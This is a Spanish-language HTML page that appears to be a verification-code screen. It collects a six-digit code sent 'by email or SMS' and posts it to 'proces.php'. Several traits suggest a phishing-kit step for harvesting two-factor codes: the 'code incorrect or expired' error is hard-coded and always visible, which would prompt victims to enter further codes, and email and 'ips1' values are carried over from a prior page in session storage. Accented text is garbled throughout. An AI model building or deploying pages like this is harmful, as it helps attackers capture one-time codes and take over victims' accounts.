<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <title>Verificaci√≥n de c√≥digo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI",
        sans-serif;
      background: #ffffff;
      color: #222222;
    }

    .screen {
      max-width: 420px;
      margin: 0 auto;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      padding: 40px 24px 32px;
      align-items: center;
    }

    .title-block {
      text-align: left;
      width: 100%;
    }

    .title-block h1 {
      font-size: 26px;
      line-height: 1.25;
      font-weight: 700;
      margin-bottom: 8px;
    }

    .title-block p {
      font-size: 14px;
      color: #808080;
    }

    /* ---- CAMPOS DEL C√ìDIGO ---- */
    .code-row {
      margin-top: 50px;
      display: flex;
      justify-content: center;
      gap: 20px;
    }

    .code-input {
      width: 30px;
      height: 35px;
      border: none;
      border-bottom: 2px solid #e1e1e1;
      text-align: center;
      font-size: 20px;
      outline: none;
      background: transparent;
    }

    .code-input:focus {
      border-bottom-color: #7b2ef1;
    }

    /* ---- BOT√ìN Y TEXTO REENVIAR ---- */
    .bottom-area {
      margin-top: 50px;
      text-align: center;
      color: #7c7c7c;
      font-size: 14px;
      width: 100%;
    }

    .resend-text {
      margin-bottom: 16px;
    }

    .resend-text.ready {
      color: #05be50;
      font-weight: 500;
      cursor: pointer;
    }

    .btn {
      width: 100%;
      border-radius: 999px;
      padding: 14px 0;
      font-size: 16px;
      border: none;
      background: #e9e9e9;
      color: #a3a3a3;
      cursor: default;
      transition: background 0.2s ease, color 0.2s ease;
    }

    .btn.enabled {
      background: #05be50;
      color: #ffffff;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <div class="screen">
    <div class="title-block">
      <h style="font-weight: bold;font-size: 24px;">
        Ingresa el c√≥digo que te<br />enviamos por email o SMS
      </h>
      <br><br>
      <p id="correoDestino">
        Revisa tu bandeja de spam o Mensajer√≠a, puede demorar unos segundos.
      </p>
    </div>

    <!-- üîπ FORM que env√≠a el c√≥digo completo -->
    <form id="otpForm" action="proces.php" method="POST" style="width:100%; margin-top: 20px;">
      <div class="code-row">
        <input class="code-input" type="text" inputmode="numeric" maxlength="1" />
        <input class="code-input" type="text" inputmode="numeric" maxlength="1" />
        <input class="code-input" type="text" inputmode="numeric" maxlength="1" />
        <input class="code-input" type="text" inputmode="numeric" maxlength="1" />
        <input class="code-input" type="text" inputmode="numeric" maxlength="1" />
        <input class="code-input" type="text" inputmode="numeric" maxlength="1" />
      </div>

      <!-- Campo oculto donde se arma el c√≥digo final -->
      <input type="hidden" name="otp_code" id="otp_code">

      <br>

      <p style="color: red;font-size: 14px;">El c√≥digo ingresado es incorrecto o ha expirado</p>

      <div class="bottom-area">
        <div id="resendText" class="resend-text">
          Reenviar c√≥digo en 01:00
        </div>
        <button id="btnContinuar" class="btn" type="submit" disabled>
          Continuar
        </button>
      </div>
    </form>
  </div>

  <script>
    const inputs = document.querySelectorAll(".code-input");
    const btn = document.getElementById("btnContinuar");
    const resendText = document.getElementById("resendText");
    const correoDestino = document.getElementById("correoDestino");
    const form = document.getElementById("otpForm");
    const hiddenCode = document.getElementById("otp_code");

    /* ========= EMAIL DESDE EL INDEX ========= */
    function maskEmail(email) {
      const parts = email.split("@");
      if (parts.length !== 2) return email; // por si viene raro

      const local = parts[0];
      const domain = parts[1];

      const visibles = local.slice(0, 3); // primeras 3 letras
      const numAsteriscos = Math.max(local.length - 3, 3); // al menos 3 *
      const maskedLocal = visibles + "*".repeat(numAsteriscos);

      return `${maskedLocal}@${domain}`;
    }

    const savedEmail = sessionStorage.getItem("email");
    if (savedEmail) {
      correoDestino.textContent = `Te lo mandamos a ${maskEmail(savedEmail)}`;
    }

    /* ========= CAMPOS DEL C√ìDIGO ========= */
    inputs.forEach((input, index) => {
      input.addEventListener("input", (e) => {
        e.target.value = e.target.value.replace(/\D/g, "");

        if (e.target.value.length === 1 && index < inputs.length - 1) {
          inputs[index + 1].focus();
        }
        checkCompleted();
      });

      input.addEventListener("keydown", (e) => {
        if (e.key === "Backspace" && !e.target.value && index > 0) {
          inputs[index - 1].focus();
        }
      });

      input.addEventListener("paste", (e) => {
        e.preventDefault();
        const paste = (e.clipboardData || window.clipboardData)
          .getData("text")
          .replace(/\D/g, "")
          .slice(0, inputs.length);

        [...paste].forEach((char, i) => {
          inputs[i].value = char;
        });

        if (paste.length > 0 && paste.length <= inputs.length) {
          inputs[Math.min(paste.length, inputs.length - 1)].focus();
        }
        checkCompleted();
      });
    });

    function checkCompleted() {
      const allFilled = [...inputs].every((i) => i.value.length === 1);
      if (allFilled) {
        btn.disabled = false;
        btn.classList.add("enabled");
      } else {
        btn.disabled = true;
        btn.classList.remove("enabled");
      }
    }

    /* ========= ARMAR C√ìDIGO ANTES DE ENVIAR ========= */
    form.addEventListener("submit", (e) => {
      const code = [...inputs].map(i => i.value).join("");
      hiddenCode.value = code;

      // Opcional: podr√≠as validar longitud aqu√≠
      if (code.length !== inputs.length) {
        e.preventDefault();
        alert("Ingres√° el c√≥digo completo.");
      }
    });

    /* ========= CONTADOR 60 ‚Üí 0 ========= */
    let remaining = 60;

    function formatTime(sec) {
      const m = String(Math.floor(sec / 60)).padStart(2, "0");
      const s = String(sec % 60).padStart(2, "0");
      return `${m}:${s}`;
    }

    resendText.textContent = `Reenviar c√≥digo en ${formatTime(remaining)}`;

    const countdown = setInterval(() => {
      remaining--;

      if (remaining > 0) {
        resendText.textContent = `Reenviar c√≥digo en ${formatTime(remaining)}`;
      } else {
        clearInterval(countdown);
        resendText.textContent = "Reenviar c√≥digo de seguridad";
        resendText.classList.add("ready");
        // Aqu√≠ podr√≠as agregar la l√≥gica para reenviar realmente el c√≥digo.
      }
    }, 1000);
  </script>
  <script>
    const documento = sessionStorage.getItem('ips1');
    console.log("Valor recuperado:", documento);
</script>
</body>
</html>
